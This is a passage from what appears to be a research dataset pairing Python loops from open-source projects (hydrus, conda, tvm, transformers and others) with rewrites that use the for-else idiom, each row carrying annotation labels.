    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
else:
    raise ExtractorError('Unable to find feed id')","for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
else:
    raise ExtractorError('Unable to find feed id')",1,"for script in reversed(scripts):
    feed_script = self._download_webpage(self._proto_relative_url(script, 'http:'), video_id, 'Downloading feed script')
    feed_id = self._search_regex('defaultFeedId\\s*:\\s*""([^""]+)""', feed_script, 'default feed id', default=None)
    if feed_id is not None:
        break
if feed_id is None:
    raise ExtractorError('Unable to find feed id')","break statement is executed:None
break statement is not executed:zejun1"
hydrus,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hydrus/hydrus/server/ServerController.py,https://github.com/hydrusnetwork/hydrus/tree/master/hydrus/server/ServerController.py,,ShutdownSiblingInstance$80,"def ShutdownSiblingInstance( db_dir ):
    
    port_found = False
    
    ports = HydrusData.GetSiblingProcessPorts( db_dir, 'server' )
    
    if ports is None:
        
        raise HydrusExceptions.ShutdownException( 'Could not figure out the existing server\'s ports, so could not shut it down!' )
        
    
    session = requests.Session()
    
    session.verify = False
    
    for port in ports:
        
        try:
            
            r = session.get( 'https://127.0.0.1:' + str( port ) + '/' )
            
            server_name = r.headers[ 'Server' ]
            
        except:
            
            text = 'Could not contact existing server\'s port ' + str( port ) + '!'
            text += os.linesep
            text += traceback.format_exc()
            
            raise HydrusExceptions.ShutdownException( text )
            
        
        if 'server administration' in server_name:
            
            port_found = True
            
            HydrusData.Print( 'Sending shut down instruction\u2026' )
            
            r = session.post( 'https://127.0.0.1:' + str( port ) + '/shutdown' )
            
            if not r.ok:
                
                text = 'When told to shut down, the existing server gave an error!'
                text += os.linesep
                text += r.text
                
                raise HydrusExceptions.ShutdownException( text )
                
            
            time_waited = 0
            
            while HydrusData.IsAlreadyRunning( db_dir, 'server' ):
                
                time.sleep( 1 )
                
                time_waited += 1
                
                if time_waited > 20:
                    
                    raise HydrusExceptions.ShutdownException( 'Attempted to shut the existing server down, but it took too long!' )
                    
                
            
            break
            
        
    
    if not port_found:
        
        raise HydrusExceptions.ShutdownException( 'The existing server did not have an administration service!' )
        
    
    HydrusData.Print( 'The existing server is shut down!' )","for port in ports:
    try:
        r = session.get('https://127.0.0.1:' + str(port) + '/')
        server_name = r.headers['Server']
    except:
        text = ""Could not contact existing server's port "" + str(port) + '!'
        text += os.linesep
        text += traceback.format_exc()
        raise HydrusExceptions.ShutdownException(text)
    if 'server administration' in server_name:
        port_found = True
        HydrusData.Print('Sending shut down instruction…')
        r = session.post('https://127.0.0.1:' + str(port) + '/shutdown')
        if not r.ok:
            text = 'When told to shut down, the existing server gave an error!'
            text += os.linesep
            text += r.text
            raise HydrusExceptions.ShutdownException(text)
        time_waited = 0
        while HydrusData.IsAlreadyRunning(db_dir, 'server'):
            time.sleep(1)
            time_waited += 1
            if time_waited > 20:
                raise HydrusExceptions.ShutdownException('Attempted to shut the existing server down, but it took too long!')
        break
if not port_found:
    raise HydrusExceptions.ShutdownException('The existing server did not have an administration service!')","for port in ports:
    try:
        r = session.get('https://127.0.0.1:' + str(port) + '/')
        server_name = r.headers['Server']
    except:
        text = ""Could not contact existing server's port "" + str(port) + '!'
        text += os.linesep
        text += traceback.format_exc()
        raise HydrusExceptions.ShutdownException(text)
    if 'server administration' in server_name:
        HydrusData.Print('Sending shut down instruction…')
        r = session.post('https://127.0.0.1:' + str(port) + '/shutdown')
        if not r.ok:
            text = 'When told to shut down, the existing server gave an error!'
            text += os.linesep
            text += r.text
            raise HydrusExceptions.ShutdownException(text)
        time_waited = 0
        while HydrusData.IsAlreadyRunning(db_dir, 'server'):
            time.sleep(1)
            time_waited += 1
            if time_waited > 20:
                raise HydrusExceptions.ShutdownException('Attempted to shut the existing server down, but it took too long!')
        break
else:
    raise HydrusExceptions.ShutdownException('The existing server did not have an administration service!')","for port in ports:
    try:
        r = session.get('https://127.0.0.1:' + str(port) + '/')
        server_name = r.headers['Server']
    except:
        text = ""Could not contact existing server's port "" + str(port) + '!'
        text += os.linesep
        text += traceback.format_exc()
        raise HydrusExceptions.ShutdownException(text)
    if 'server administration' in server_name:
        HydrusData.Print('Sending shut down instruction…')
        r = session.post('https://127.0.0.1:' + str(port) + '/shutdown')
        if not r.ok:
            text = 'When told to shut down, the existing server gave an error!'
            text += os.linesep
            text += r.text
            raise HydrusExceptions.ShutdownException(text)
        time_waited = 0
        while HydrusData.IsAlreadyRunning(db_dir, 'server'):
            time.sleep(1)
            time_waited += 1
            if time_waited > 20:
                raise HydrusExceptions.ShutdownException('Attempted to shut the existing server down, but it took too long!')
        break
else:
    raise HydrusExceptions.ShutdownException('The existing server did not have an administration service!')",1,"for port in ports:
    try:
        r = session.get('https://127.0.0.1:' + str(port) + '/')
        server_name = r.headers['Server']
    except:
        text = ""Could not contact existing server's port "" + str(port) + '!'
        text += os.linesep
        text += traceback.format_exc()
        raise HydrusExceptions.ShutdownException(text)
    if 'server administration' in server_name:
        port_found = True
        HydrusData.Print('Sending shut down instruction…')
        r = session.post('https://127.0.0.1:' + str(port) + '/shutdown')
        if not r.ok:
            text = 'When told to shut down, the existing server gave an error!'
            text += os.linesep
            text += r.text
            raise HydrusExceptions.ShutdownException(text)
        time_waited = 0
        while HydrusData.IsAlreadyRunning(db_dir, 'server'):
            time.sleep(1)
            time_waited += 1
            if time_waited > 20:
                raise HydrusExceptions.ShutdownException('Attempted to shut the existing server down, but it took too long!')
        break
if not port_found:
    raise HydrusExceptions.ShutdownException('The existing server did not have an administration service!')","break statement is executed:None
break statement is not executed:zejun1"
anchore-engine,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/anchore-engine/anchore_engine/util/langpack.py,https://github.com/anchore/anchore-engine/tree/master/anchore_engine/util/langpack.py,,normalized_version_match$109,"def normalized_version_match(rawsemver, rawpkgver, language=""python""):
    versionmatch = False

    vranges = re.split(r"" *\|\| *"", rawsemver)
    # or check
    inrange = False
    for vrange in vranges:
        vrange = vrange.strip()
        if vrange in [""*"", ""all""]:
            inrange = True
            break

        tokre = re.compile(r""[!|<|>|=|~|^]+\s*[^\s]+"")
        rangechecks = tokre.findall(vrange)

        # and check
        violation = False
        if not rangechecks:
            raise Exception(""invalid range detected - {}"".format(vrange))

        for rangecheck in rangechecks:
            rangecheck = re.sub(r""\s+"", """", rangecheck)
            patt = re.match(""([!|<|>|=|~|^]+)(.*)"", rangecheck)
            if patt:
                op, verraw = (patt.group(1), patt.group(2))
                inrange = language_compare(rawpkgver, op, verraw, language=language)

                if not inrange:
                    violation = True
                    break

        if not violation:
            inrange = True
            break

    if inrange:
        versionmatch = True

    return versionmatch","for rangecheck in rangechecks:
    rangecheck = re.sub('\\s+', '', rangecheck)
    patt = re.match('([!|<|>|=|~|^]+)(.*)', rangecheck)
    if patt:
        (op, verraw) = (patt.group(1), patt.group(2))
        inrange = language_compare(rawpkgver, op, verraw, language=language)
        if not inrange:
            violation = True
            break
if not violation:
    inrange = True
    break","for rangecheck in rangechecks:
    rangecheck = re.sub('\\s+', '', rangecheck)
    patt = re.match('([!|<|>|=|~|^]+)(.*)', rangecheck)
    if patt:
        (op, verraw) = (patt.group(1), patt.group(2))
        inrange = language_compare(rawpkgver, op, verraw, language=language)
        if not inrange:
            break
else:
    inrange = True
    break","for rangecheck in rangechecks:
    rangecheck = re.sub('\\s+', '', rangecheck)
    patt = re.match('([!|<|>|=|~|^]+)(.*)', rangecheck)
    if patt:
        (op, verraw) = (patt.group(1), patt.group(2))
        inrange = language_compare(rawpkgver, op, verraw, language=language)
        if not inrange:
            break
else:
    inrange = True
    break",1,"for rangecheck in rangechecks:
    rangecheck = re.sub('\\s+', '', rangecheck)
    patt = re.match('([!|<|>|=|~|^]+)(.*)', rangecheck)
    if patt:
        (op, verraw) = (patt.group(1), patt.group(2))
        inrange = language_compare(rawpkgver, op, verraw, language=language)
        if not inrange:
            violation = True
            break
if not violation:
    inrange = True
    break","break statement is executed:None
break statement is not executed:zejun1"
tvm,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tvm/tests/python/frontend/tensorflow/test_forward.py,https://github.com/apache/tvm/tree/master/tests/python/frontend/tensorflow/test_forward.py,,run_tvm_graph$124,"def run_tvm_graph(
    graph_def,
    input_data,
    input_node,
    num_output=1,
    target=""llvm"",
    out_names=None,
    opt_level=3,
    mode=""graph_executor"",
    cuda_layout=""NCHW"",
    layout=None,
    disabled_pass=None,
    ignore_in_shape=False,
    serialize=False,
    convert_config=None,
):
    """"""Generic function to compile on relay and execute on tvm""""""
    input_data = convert_to_list(input_data)
    input_node = convert_to_list(input_node)
    if target == ""cuda"":
        layout = cuda_layout
    target_host = None
    if ignore_in_shape:
        shape_dict = None
    else:
        shape_dict = {
            e: i.shape if hasattr(i, ""shape"") else () for e, i in zip(input_node, input_data)
        }
    mod, params = relay.frontend.from_tensorflow(
        graph_def,
        layout=layout,
        shape=shape_dict,
        outputs=out_names,
        convert_config=convert_config,
    )

    dev = tvm.device(target, 0)
    if mode == ""debug"":
        inputs = []
        for param in mod[""main""].params:
            found = False
            for i, n in enumerate(input_node):
                if n == param.name_hint:
                    found = True
                    inputs.append(tvm.nd.array(input_data[i]))
                    break
            # Interpreter doesn't bind constants, so still need to find in params
            if not found:
                inputs.append(tvm.nd.array(params[param.name_hint]))
        result = relay.create_executor(mode, mod=mod, device=tvm.cpu(), target=""llvm"").evaluate()(
            *inputs
        )
        return vmobj_to_list(result)
    elif mode == ""vm"":
        with tvm.transform.PassContext(opt_level=opt_level, disabled_pass=disabled_pass):
            mod = relay.transform.InferType()(mod)
            vm_exec = relay.vm.compile(mod, target=""llvm"", params=params)
        if serialize:
            code, lib = vm_exec.save()
            vm_exec = tvm.runtime.vm.Executable.load_exec(code, lib)
        vm = VirtualMachine(vm_exec, tvm.cpu())
        inputs = {}
        for e, i in zip(input_node, input_data):
            inputs[e] = tvm.nd.array(i)
        result = vm.invoke(""main"", **inputs)
        return vmobj_to_list(result)
    else:
        with tvm.transform.PassContext(opt_level=opt_level, disabled_pass=disabled_pass):
            target = tvm.target.Target(target, target_host)
            graph, lib, params = relay.build(mod, target=target, params=params)

        m = graph_executor.create(graph, lib, dev)
        # set inputs
        for e, i in zip(input_node, input_data):
            if e != """":
                m.set_input(e, tvm.nd.array(i))

        m.set_input(**params)
        # execute
        m.run()
        # get outputs
        assert out_names is None or num_output == len(
            out_names
        ), f""out_names: {out_names} num_output: {num_output}""
        tvm_output_list = [m.get_output(i).numpy() for i in range(num_output)]
        return tvm_output_list","for (i, n) in enumerate(input_node):
    if n == param.name_hint:
        found = True
        inputs.append(tvm.nd.array(input_data[i]))
        break
if not found:
    inputs.append(tvm.nd.array(params[param.name_hint]))","for (i, n) in enumerate(input_node):
    if n == param.name_hint:
        inputs.append(tvm.nd.array(input_data[i]))
        break
else:
    inputs.append(tvm.nd.array(params[param.name_hint]))","for (i, n) in enumerate(input_node):
    if n == param.name_hint:
        inputs.append(tvm.nd.array(input_data[i]))
        break
else:
    inputs.append(tvm.nd.array(params[param.name_hint]))",1,"for (i, n) in enumerate(input_node):
    if n == param.name_hint:
        found = True
        inputs.append(tvm.nd.array(input_data[i]))
        break
if not found:
    inputs.append(tvm.nd.array(params[param.name_hint]))","break statement is executed:None
break statement is not executed:zejun1"
MoniGoMani,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/MoniGoMani/user_data/strategies/MasterMoniGoManiHyperStrategy.py,https://github.com/Rikj000/MoniGoMani/tree/master/user_data/strategies/MasterMoniGoManiHyperStrategy.py,MasterMoniGoManiHyperStrategy,custom_stoploss$671,"def custom_stoploss(self, pair: str, trade: Trade, current_time: datetime,
                        current_rate: float, current_profit: float, **kwargs) -> float:
        """"""
        Open Trade Custom Information Storage & Garbage Collector
        ---------------------------------------------------------
        MoniGoMani (currently) only uses this function to store custom information from all open_trades at that given
        moment during BackTesting/HyperOpting or Dry/Live-Running
        Further it also does garbage collection to make sure no old closed trade data remains in custom_info

        The actual normal ""custom_stoploss"" usage for which this function is generally used isn't used by MGM (yet)!
        This custom_stoploss function should be able to work in tandem with Trailing stoploss!

        :param pair: Pair that's currently analyzed
        :param trade: trade object.
        :param current_time: datetime object, containing the current datetime
        :param current_rate: Rate, calculated based on pricing settings in ask_strategy.
        :param current_profit: Current profit (as ratio), calculated based on current_rate.
        :param **kwargs: Ensure to keep this here so updates to this won't break MoniGoMani.
        :return float: New stoploss value, relative to the current-rate
        """"""

        cis = 'custom_stoploss - Custom Information Storage'
        gc = cis + ' Garbage Collector'

        # Open Trade Custom Information Storage
        # -------------------------------------
        # Fetch all open trade data depending on RunMode
        all_open_trades = self.get_all_current_open_trades(trade)

        # Store current pair's open_trade + it's current profit in custom_info
        for open_trade in all_open_trades:
            if str(open_trade.pair) == pair:
                if str(open_trade.pair) not in self.custom_info['open_trades']:
                    self.custom_info['open_trades'][str(open_trade.pair)] = {}
                self.custom_info['open_trades'][str(open_trade.pair)]['trade'] = str(open_trade)
                self.custom_info['open_trades'][str(open_trade.pair)]['current_profit'] = current_profit
                self.mgm_logger('info', cis, f'Storing trade + current profit/loss for pair ({pair}) in custom_info')
                break

        # Custom Information Storage Garbage Collector
        # --------------------------------------------
        # Check if any old open_trade garbage needs to be removed
        if len(all_open_trades) < len(self.custom_info['open_trades']):
            garbage_trade_amount = len(self.custom_info['open_trades']) - len(all_open_trades)
            self.mgm_logger('info', gc,
                            f'Old open trade garbage detected for {str(garbage_trade_amount)} trades, starting cleanup')

            for garbage_trade in range(garbage_trade_amount):
                for stored_trade in self.custom_info['open_trades']:
                    pair_still_open = False
                    for open_trade in all_open_trades:
                        if str(stored_trade) == str(open_trade.pair):
                            self.mgm_logger('debug', gc, f'Open trade found, '
                                                         f'no action needed for pair ({stored_trade}) in custom_info')
                            pair_still_open = True
                            break

                    # Remove old open_trade garbage
                    if not pair_still_open:
                        self.mgm_logger('info', gc,
                                        f'No open trade found for pair ({stored_trade}), removing from custom_info')
                        self.custom_info['open_trades'].pop(stored_trade)
                        self.mgm_logger('debug', gc,
                                        f'Successfully removed garbage_trade {str(garbage_trade)} from custom_info!')
                        break

        # Print all stored open trade info in custom_storage
        self.mgm_logger('debug', cis, f'Open trades ({str(len(self.custom_info[""open_trades""]))}) '
                                      f'in custom_info updated successfully!')
        self.mgm_logger('debug', cis, f'custom_info[""open_trades""] contents: {repr(self.custom_info[""open_trades""])}')

        # Always return a value bigger than the initial stoploss to keep using the initial stoploss.
        # Since we (currently) only want to use this function for custom information storage!
        return -1","for open_trade in all_open_trades:
    if str(stored_trade) == str(open_trade.pair):
        self.mgm_logger('debug', gc, f'Open trade found, no action needed for pair ({stored_trade}) in custom_info')
        pair_still_open = True
        break
if not pair_still_open:
    self.mgm_logger('info', gc, f'No open trade found for pair ({stored_trade}), removing from custom_info')
    self.custom_info['open_trades'].pop(stored_trade)
    self.mgm_logger('debug', gc, f'Successfully removed garbage_trade {str(garbage_trade)} from custom_info!')
    break","for open_trade in all_open_trades:
    if str(stored_trade) == str(open_trade.pair):
        self.mgm_logger('debug', gc, f'Open trade found, no action needed for pair ({stored_trade}) in custom_info')
        break
else:
    self.mgm_logger('info', gc, f'No open trade found for pair ({stored_trade}), removing from custom_info')
    self.custom_info['open_trades'].pop(stored_trade)
    self.mgm_logger('debug', gc, f'Successfully removed garbage_trade {str(garbage_trade)} from custom_info!')
    break","for open_trade in all_open_trades:
    if str(stored_trade) == str(open_trade.pair):
        self.mgm_logger('debug', gc, f'Open trade found, no action needed for pair ({stored_trade}) in custom_info')
        break
else:
    self.mgm_logger('info', gc, f'No open trade found for pair ({stored_trade}), removing from custom_info')
    self.custom_info['open_trades'].pop(stored_trade)
    self.mgm_logger('debug', gc, f'Successfully removed garbage_trade {str(garbage_trade)} from custom_info!')
    break",1,"for open_trade in all_open_trades:
    if str(stored_trade) == str(open_trade.pair):
        self.mgm_logger('debug', gc, f'Open trade found, no action needed for pair ({stored_trade}) in custom_info')
        pair_still_open = True
        break
if not pair_still_open:
    self.mgm_logger('info', gc, f'No open trade found for pair ({stored_trade}), removing from custom_info')
    self.custom_info['open_trades'].pop(stored_trade)
    self.mgm_logger('debug', gc, f'Successfully removed garbage_trade {str(garbage_trade)} from custom_info!')
    break","break statement is executed:None
break statement is not executed:zejun1"
LSP,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/LSP/plugin/core/windows.py,https://github.com/sublimelsp/LSP/tree/master/plugin/core/windows.py,WindowManager,_needed_config$306,"def _needed_config(self, view: sublime.View) -> Optional[ClientConfig]:
        configs = self._configs.match_view(view)
        handled = False
        file_name = view.file_name()
        inside = self._workspace.contains(view)
        for config in configs:
            handled = False
            for session in self._sessions:
                if config.name == session.config.name and session.handles_path(file_name, inside):
                    handled = True
                    break
            if not handled:
                return config
        return None","for session in self._sessions:
    if config.name == session.config.name and session.handles_path(file_name, inside):
        handled = True
        break
if not handled:
    return config","for session in self._sessions:
    if config.name == session.config.name and session.handles_path(file_name, inside):
        break
else:
    return config","for session in self._sessions:
    if config.name == session.config.name and session.handles_path(file_name, inside):
        break
else:
    return config",1,"for session in self._sessions:
    if config.name == session.config.name and session.handles_path(file_name, inside):
        handled = True
        break
if not handled:
    return config","break statement is executed:None
break statement is not executed:zejun1"
conda,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/conda/conda/common/_os/linux.py,https://github.com/conda/conda/tree/master/conda/common/_os/linux.py,,linux_get_libc_version$19,"def linux_get_libc_version():
    """"""
    If on linux, returns (libc_family, version), otherwise (None, None).
    """"""

    if not sys.platform.startswith('linux'):
        return None, None

    from os import confstr, confstr_names, readlink

    # Python 2.7 does not have either of these keys in confstr_names, so provide
    # hard-coded defaults and assert if the key is in confstr_names but differs.
    # These are defined by POSIX anyway so should never change.
    confstr_names_fallback = OrderedDict([('CS_GNU_LIBC_VERSION', 2),
                                          ('CS_GNU_LIBPTHREAD_VERSION', 3)])

    val = None
    for k, v in iteritems(confstr_names_fallback):
        assert k not in confstr_names or confstr_names[k] == v, (
            ""confstr_names_fallback for %s is %s yet in confstr_names it is %s""
            """" % (k, confstr_names_fallback[k], confstr_names[k])
        )
        try:
            val = str(confstr(v))
        except Exception:  # pragma: no cover
            pass
        else:
            if val:
                break

    if not val:  # pragma: no cover
        # Weird, play it safe and assume glibc 2.5
        family, version = 'glibc', '2.5'
        log.warning(""Failed to detect libc family and version, assuming %s/%s"", family, version)
        return family, version
    family, version = val.split(' ')

    # NPTL is just the name of the threading library, even though the
    # version refers to that of uClibc. readlink() can help to try to
    # figure out a better name instead.
    if family == 'NPTL':  # pragma: no cover
        for clib in (entry.path for entry in scandir(""/lib"") if entry.name[:7] == ""libc.so""):
            clib = readlink(clib)
            if exists(clib):
                if clib.startswith('libuClibc'):
                    if version.startswith('0.'):
                        family = 'uClibc'
                    else:
                        family = 'uClibc-ng'
                    return family, version
        # This could be some other C library; it is unlikely though.
        family = 'uClibc'
        log.warning(""Failed to detect non-glibc family, assuming %s (%s)"", family, version)
        return family, version
    return family, version","for (k, v) in iteritems(confstr_names_fallback):
    assert k not in confstr_names or confstr_names[k] == v, 'confstr_names_fallback for %s is %s yet in confstr_names it is %s' % (k, confstr_names_fallback[k], confstr_names[k])
    try:
        val = str(confstr(v))
    except Exception:
        pass
    else:
        if val:
            break
if not val:
    (family, version) = ('glibc', '2.5')
    log.warning('Failed to detect libc family and version, assuming %s/%s', family, version)
    return (family, version)","for (k, v) in iteritems(confstr_names_fallback):
    assert k not in confstr_names or confstr_names[k] == v, 'confstr_names_fallback for %s is %s yet in confstr_names it is %s' % (k, confstr_names_fallback[k], confstr_names[k])
    try:
        val = str(confstr(v))
    except Exception:
        pass
    else:
        if val:
            break
else:
    (family, version) = ('glibc', '2.5')
    log.warning('Failed to detect libc family and version, assuming %s/%s', family, version)
    return (family, version)","for (k, v) in iteritems(confstr_names_fallback):
    assert k not in confstr_names or confstr_names[k] == v, 'confstr_names_fallback for %s is %s yet in confstr_names it is %s' % (k, confstr_names_fallback[k], confstr_names[k])
    try:
        val = str(confstr(v))
    except Exception:
        pass
    else:
        if val:
            break
else:
    (family, version) = ('glibc', '2.5')
    log.warning('Failed to detect libc family and version, assuming %s/%s', family, version)
    return (family, version)",1,"for (k, v) in iteritems(confstr_names_fallback):
    assert k not in confstr_names or confstr_names[k] == v, 'confstr_names_fallback for %s is %s yet in confstr_names it is %s' % (k, confstr_names_fallback[k], confstr_names[k])
    try:
        val = str(confstr(v))
    except Exception:
        pass
    else:
        if val:
            break
if not val:
    (family, version) = ('glibc', '2.5')
    log.warning('Failed to detect libc family and version, assuming %s/%s', family, version)
    return (family, version)","break statement is executed:None
break statement is not executed:zejun1"
PyGaze,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PyGaze/pygaze/_eyetracker/pytribe.py,https://github.com/esdalmaijer/PyGaze/tree/master/pygaze/_eyetracker/pytribe.py,connection,request$637,"def request(self, category, request, values):

        """"""Send a message over the connection

        arguments

        category    --    string indicating the query category
        request    --    string indicating the actual request of the message
        values    --    dict or list containing parameters of the request
        """"""
        
        # Create a JSON-formatted string for the current request.
        msg = self.create_json(category, request, values)
        
        # Acquire the lock, to prevent simultaneous access.
        self._request_lock.acquire()
        # Clear the response that's currently in memory.
        if category == 'heartbeat':
            self._responses[category] = None
        elif category == 'calibration':
            self._responses[category][request] = None
        elif category == 'tracker':
            self._responses[category][request][values[0]] = None
        # Release the lock, to allow other Threads to access the
        # _responses dict again.
        self._request_lock.release()

        # Send the JSON-formatted message over the connection.
        self._request_lock.acquire()
        self.sock.send(msg.encode(""utf-8""))
        self._request_lock.release()

        # Store request in DEBUG mode.
        if self.DEBUG:
            self._debuglock.acquire()
            self._debugfile.write(""\nREQUEST ({}): '{}'"".format( \
                int(time.time()*1000), msg))
            self._debuglock.release()
        
        # Wait until a response is available.
        r = None
        t0 = time.time()
        success = False
        while time.time() - t0 <= self.response_timeout:
            # Acquire the lock, to prevent simultaneous access.
            self._request_lock.acquire()
            # Check if a response is available.
            if category == 'heartbeat':
                r = self._responses[category]
            elif category == 'calibration':
                r = self._responses[category][request]
            elif category == 'tracker':
                r = self._responses[category][request][values[0]]
            # Release the lock, to allow other Threads to access the
            # _responses dict again.
            self._request_lock.release()
            # Wait for a bit if no response is available.
            if r == None:
                time.sleep(0.005)
            else:
                success = True
                break

        # If we couldn't find the response that matches our request, return
        # a 404 status message.
        if not success:
            r = self.parse_json('{""statuscode"":404,""values"":{""statusmessage"":""could not find response to this request""}}')

        # Parse and return the response.
        return r","while time.time() - t0 <= self.response_timeout:
    self._request_lock.acquire()
    if category == 'heartbeat':
        r = self._responses[category]
    elif category == 'calibration':
        r = self._responses[category][request]
    elif category == 'tracker':
        r = self._responses[category][request][values[0]]
    self._request_lock.release()
    if r == None:
        time.sleep(0.005)
    else:
        success = True
        break
if not success:
    r = self.parse_json('{""statuscode"":404,""values"":{""statusmessage"":""could not find response to this request""}}')","while time.time() - t0 <= self.response_timeout:
    self._request_lock.acquire()
    if category == 'heartbeat':
        r = self._responses[category]
    elif category == 'calibration':
        r = self._responses[category][request]
    elif category == 'tracker':
        r = self._responses[category][request][values[0]]
    self._request_lock.release()
    if r == None:
        time.sleep(0.005)
    else:
        break
else:
    r = self.parse_json('{""statuscode"":404,""values"":{""statusmessage"":""could not find response to this request""}}')","while time.time() - t0 <= self.response_timeout:
    self._request_lock.acquire()
    if category == 'heartbeat':
        r = self._responses[category]
    elif category == 'calibration':
        r = self._responses[category][request]
    elif category == 'tracker':
        r = self._responses[category][request][values[0]]
    self._request_lock.release()
    if r == None:
        time.sleep(0.005)
    else:
        break
else:
    r = self.parse_json('{""statuscode"":404,""values"":{""statusmessage"":""could not find response to this request""}}')",1,"while time.time() - t0 <= self.response_timeout:
    self._request_lock.acquire()
    if category == 'heartbeat':
        r = self._responses[category]
    elif category == 'calibration':
        r = self._responses[category][request]
    elif category == 'tracker':
        r = self._responses[category][request][values[0]]
    self._request_lock.release()
    if r == None:
        time.sleep(0.005)
    else:
        success = True
        break
if not success:
    r = self.parse_json('{""statuscode"":404,""values"":{""statusmessage"":""could not find response to this request""}}')","break statement is executed:None
break statement is not executed:zejun1"
pyradio,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyradio/pyradio/browser.py,https://github.com/coderholic/pyradio/tree/master/pyradio/browser.py,RadioBrowserSearchWindow,_focus_next$2650,"def _focus_next(self):
        # logger.error('DE focus next ==========================')
        new_focus = self._focus + 1
        if new_focus == len(self._widgets):
            new_focus = 0
        # logger.error('DE new_focus = {}'.format(new_focus))
        focus_ok = False
        for i in range(new_focus, len(self._widgets)):
            if self._widgets[i].enabled:
                new_focus = i
                focus_ok = True
                # logger.error('DE 1 new_focus = {}'.format(new_focus))
                break
        if not focus_ok:
            for i in range(0, new_focus + 1):
                if self._widgets[i].enabled:
                    new_focus = i
                    focus_ok = True
                    # logger.error('DE 2 new_focus = {}'.format(new_focus))
                    break
        # logger.error('DE new_focus = {}'.format(new_focus))
        # logger.error('DE end focus next ==========================')
        self._apply_new_focus(new_focus)","for i in range(new_focus, len(self._widgets)):
    if self._widgets[i].enabled:
        new_focus = i
        focus_ok = True
        break
if not focus_ok:
    for i in range(0, new_focus + 1):
        if self._widgets[i].enabled:
            new_focus = i
            focus_ok = True
            break","for i in range(new_focus, len(self._widgets)):
    if self._widgets[i].enabled:
        new_focus = i
        focus_ok = True
        break
else:
    for i in range(0, new_focus + 1):
        if self._widgets[i].enabled:
            new_focus = i
            focus_ok = True
            break","for i in range(new_focus, len(self._widgets)):
    if self._widgets[i].enabled:
        new_focus = i
        focus_ok = True
        break
else:
    for i in range(0, new_focus + 1):
        if self._widgets[i].enabled:
            new_focus = i
            focus_ok = True
            break",1,"for i in range(new_focus, len(self._widgets)):
    if self._widgets[i].enabled:
        new_focus = i
        focus_ok = True
        break
if not focus_ok:
    for i in range(0, new_focus + 1):
        if self._widgets[i].enabled:
            new_focus = i
            focus_ok = True
            break","break statement is executed:None
break statement is not executed:zejun1"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/tapas/tokenization_tapas.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/tapas/tokenization_tapas.py,WordpieceTokenizer,tokenize$2199,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/tapas/tokenization_tapas.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/tapas/tokenization_tapas.py,WordpieceTokenizer,tokenize$2199,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
